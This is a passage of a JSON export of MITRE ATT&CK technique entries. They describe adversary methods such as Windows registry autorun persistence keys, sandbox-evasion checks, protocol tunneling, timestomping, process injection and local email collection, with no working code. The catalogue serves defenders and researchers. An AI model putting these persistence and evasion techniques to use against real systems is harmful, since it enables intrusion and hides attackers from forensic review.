startup of services during boot:\\n\\n* <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunServicesOnce</code>\\n* <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunServicesOnce</code>\\n* <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunServices</code>\\n* <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunServices</code>\\n\\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\\n\\n* <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\Run</code>\\n* <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\Run</code>\\n\\nThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\Userinit</code> and <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\Shell</code> subkeys can automatically launch programs.\\n\\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows</code> run when any user logs on.\\n\\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\\\System\\\\CurrentControlSet\\\\Control\\\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\\n\\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.\", \"modified\": \"2020-08-03T16:30:26.918Z\", \"id\": \"attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279\"}, \"attack-pattern--29be378d-262d-4e99-b00d-852d573628e6\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-06T20:57:37.959Z\", \"name\": \"System Checks\", \"attack_pattern_identifier\": \"T1497.001\", \"description\": \"Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors. \\n\\nSpecific checks may will vary based on the target and/or adversary, but may involve behaviors such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047), [PowerShell](https://attack.mitre.org/techniques/T1059/001), [System Information Discovery](https://attack.mitre.org/techniques/T1082), and [Query Registry](https://attack.mitre.org/techniques/T1012) to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. \\n\\nChecks could include generic system properties such as uptime and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. \\n\\nOther common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions.(Citation: McAfee Virtual Jan 2017) In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. \\n \\nHardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.(Citation: Unit 42 OilRig Sept 2018)\", \"modified\": \"2020-07-01T16:32:02.514Z\", \"id\": \"attack-pattern--29be378d-262d-4e99-b00d-852d573628e6\"}, \"attack-pattern--4fe28b27-b13c-453e-a386-c2ef362a573b\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-03-15T16:03:39.082Z\", \"name\": \"Protocol Tunneling\", \"attack_pattern_identifier\": \"T1572\", \"description\": \"Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. \\n\\nThere are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel.(Citation: SSH Tunneling) \\n\\n[Protocol Tunneling](https://attack.mitre.org/techniques/T1572) may also be abused by adversaries during [Dynamic Resolution](https://attack.mitre.org/techniques/T1568). Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets.(Citation: BleepingComp Godlua JUL19) \\n\\nAdversaries may also leverage [Protocol Tunneling](https://attack.mitre.org/techniques/T1572) in conjunction with [Proxy](https://attack.mitre.org/techniques/T1090) and/or [Protocol Impersonation](https://attack.mitre.org/techniques/T1001/003) to further conceal C2 communications and infrastructure. \", \"modified\": \"2020-03-27T17:15:35.372Z\", \"id\": \"attack-pattern--4fe28b27-b13c-453e-a386-c2ef362a573b\"}, \"attack-pattern--47f2d673-ca62-47e9-929b-1b0be9657611\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-31T12:42:44.103Z\", \"name\": \"Timestomp\", \"attack_pattern_identifier\": \"T1070.006\", \"modified\": \"2020-03-29T21:39:46.724Z\", \"description\": \"Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.\\n\\nTimestomping may be used along with file name [Masquerading](https://attack.mitre.org/techniques/T1036) to hide malware and tools.(Citation: WindowsIR Anti-Forensic Techniques)\", \"id\": \"attack-pattern--47f2d673-ca62-47e9-929b-1b0be9657611\"}, \"attack-pattern--3d333250-30e4-4a82-9edc-756c68afc529\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-02-21T20:22:13.470Z\", \"name\": \"Impair Defenses\", \"attack_pattern_identifier\": \"T1562\", \"description\": \"Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.\\n\\nAdversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components.\", \"modified\": \"2020-10-19T16:31:35.249Z\", \"id\": \"attack-pattern--3d333250-30e4-4a82-9edc-756c68afc529\"}, \"attack-pattern--d157f9d2-d09a-4efa-bb2a-64963f94e253\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-03-10T18:23:06.482Z\", \"name\": \"System Services\", \"attack_pattern_identifier\": \"T1569\", \"description\": \"Adversaries may abuse system services or daemons to execute commands or programs. Adversaries can execute malicious content by interacting with or creating services. Many services are set to run at boot, which can aid in achieving persistence ([Create or Modify System Process](https://attack.mitre.org/techniques/T1543)), but adversaries can also abuse services for one-time or temporary execution.\", \"modified\": \"2020-06-08T23:28:29.250Z\", \"id\": \"attack-pattern--d157f9d2-d09a-4efa-bb2a-64963f94e253\"}, \"attack-pattern--1cec9319-743b-4840-bb65-431547bce82a\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-10-01T01:42:24.974Z\", \"name\": \"Digital Certificates\", \"attack_pattern_identifier\": \"T1587.003\", \"description\": \"Before compromising a victim, adversaries may create self-signed SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner. In the case of self-signing, digital certificates will lack the element of trust associated with the signature of a third-party certificate authority (CA).\\n\\nAdversaries may create self-signed SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even enabling [Man-in-the-Middle](https://attack.mitre.org/techniques/T1557) if added to the root of trust (i.e. [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)).\", \"modified\": \"2020-10-22T18:18:08.422Z\", \"id\": \"attack-pattern--1cec9319-743b-4840-bb65-431547bce82a\"}, \"attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-17T19:13:50.402Z\", \"name\": \"Windows Service\", \"attack_pattern_identifier\": \"T1543.003\", \"description\": \"Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry. Service configurations can be modified using utilities such as sc.exe and [Reg](https://attack.mitre.org/software/S0075). \\n\\nAdversaries may install a new service or modify an existing service by using system utilities to interact with services, by directly modifying the Registry, or by using custom tools to interact with the Windows API. Adversaries may configure services to execute at startup in order to persist on a system.\\n\\nAn adversary may also incorporate [Masquerading](https://attack.mitre.org/techniques/T1036) by using a service name from a related operating system or benign software, or by modifying existing services to make detection analysis more challenging. Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used. \\n\\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges from administrator to SYSTEM. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002). \", \"modified\": \"2020-09-16T15:49:58.490Z\", \"id\": \"attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32\"}, \"attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:47.843Z\", \"name\": \"Process Injection\", \"attack_pattern_identifier\": \"T1055\", \"description\": \"Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \\n\\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \\n\\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. \", \"modified\": \"2020-06-20T22:28:45.651Z\", \"id\": \"attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d\"}, \"attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-09T13:48:55.078Z\", \"name\": \"PowerShell\", \"attack_pattern_identifier\": \"T1059.001\", \"modified\": \"2020-06-24T13:51:22.360Z\", \"description\": \"Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\\n\\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\\n\\nA number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)\\n\\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)\", \"id\": \"attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736\"}, \"attack-pattern--e01be9c5-e763-4caf-aeb7-000b416aef67\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-12-14T16:46:06.044Z\", \"name\": \"Create Account\", \"attack_pattern_identifier\": \"T1136\", \"description\": \"Adversaries may create an account to maintain access to victim systems. With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.\\n\\nAccounts may be created on the local system or within a domain or cloud tenant. In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection.\", \"modified\": \"2020-03-24T12:44:28.199Z\", \"id\": \"attack-pattern--e01be9c5-e763-4caf-aeb7-000b416aef67\"}, \"attack-pattern--b8902400-e6c5-4ba2-95aa-2d35b442b118\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-03-16T15:33:01.739Z\", \"name\": \"Encrypted Channel\", \"attack_pattern_identifier\": \"T1573\", \"modified\": \"2020-03-30T00:37:16.809Z\", \"description\": \"Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.\", \"id\": \"attack-pattern--b8902400-e6c5-4ba2-95aa-2d35b442b118\"}, \"attack-pattern--cc3502b5-30cc-4473-ad48-42d51a6ef6d1\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-09T14:38:24.334Z\", \"name\": \"Python\", \"attack_pattern_identifier\": \"T1059.006\", \"description\": \"Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.\\n\\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.\", \"modified\": \"2020-06-23T19:03:15.180Z\", \"id\": \"attack-pattern--cc3502b5-30cc-4473-ad48-42d51a6ef6d1\"}, \"attack-pattern--4ae4f953-fe58-4cc8-a327-33257e30a830\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:24.512Z\", \"name\": \"Application Window Discovery\", \"attack_pattern_identifier\": \"T1010\", \"description\": \"Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used or give context to information collected by a keylogger.\", \"modified\": \"2020-03-26T15:44:27.068Z\", \"id\": \"attack-pattern--4ae4f953-fe58-4cc8-a327-33257e30a830\"}, \"attack-pattern--1e9eb839-294b-48cc-b0d3-c45555a2a004\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-19T18:46:06.098Z\", \"name\": \"Local Email Collection\", \"attack_pattern_identifier\": \"T1114.001\", \"modified\": \"2020-03-24T17:59:20.983Z\", \"description\": \"Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user\\u2019s local system, such as Outlook storage or cache files.\\n\\nOutlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB.(Citation: Outlook File Sizes) IMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files. Both types of Outlook data files are typically stored in `C:\\\\Users\\\\<username>\\\\Documents\\\\Outlook Files` or `C:\\\\Users\\\\<username>\\\\AppData\\\\Local\\\\Microsoft\\\\Outlook`.(Citation: Microsoft Outlook Files)\", \"id\": \"attack-pattern--1e9eb839-294b-48cc-b0d3-c45555a2a004\"}}}"